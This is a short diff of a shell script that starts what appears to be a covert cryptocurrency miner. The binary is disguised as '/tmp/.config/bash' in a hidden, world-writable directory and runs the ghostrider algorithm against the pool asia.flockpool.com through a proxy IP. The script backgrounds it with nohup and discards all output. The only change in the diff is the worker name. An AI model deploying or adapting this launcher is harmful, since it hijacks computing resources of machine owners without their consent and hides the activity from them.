@@ -11,4 +11,4 @@ chmod -R  777 /tmp/.config
 ## 	/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.3099a --pass stu --proxy 165.22.62.162:7091
 ##	sleep 5
 ##done
-bash -c "sleep 1 && nohup /tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.3099a --pass stu --proxy 165.22.62.162:7091 >/dev/null 2>&1 &" >/dev/null 2>&1 &
+bash -c "sleep 1 && nohup /tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.3099k --pass stu --proxy 165.22.62.162:7091 >/dev/null 2>&1 &" >/dev/null 2>&1 &
